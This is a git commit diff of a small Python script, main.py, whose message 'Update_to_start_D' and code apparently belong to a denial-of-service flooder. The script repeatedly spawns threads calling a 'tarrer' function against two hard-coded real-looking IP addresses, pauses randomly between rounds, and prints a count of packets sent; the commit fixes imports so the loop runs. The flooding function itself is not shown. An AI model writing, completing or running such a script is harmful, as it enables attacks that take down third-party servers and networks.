7877c12c1bf5804c2f26cde9339099316ad1505a
alialiearan-cell <ali.aliearan@gmail.com>
2025-09-08 23:44:21 +0330

    Update_to_start_D main.py

--- main.py
+++ main.py
@@ -1,12 +1,14 @@
 import test
 import threading
-from time import uniform
+from random import uniform
+from time import sleep
 a = 0
 while True:
     threading.Thread(target=test.tarrer,args=("104.18.147.40",)).start()
     threading.Thread(target=test.tarrer,args=("104.18.146.40",)).start()
-    uniform(1,2.5)
+    sleep(uniform(1,2.5))
     if a == 100:
         break
     a += 1 
 print(f"finish all code\nsended packet:{test.i}")
+
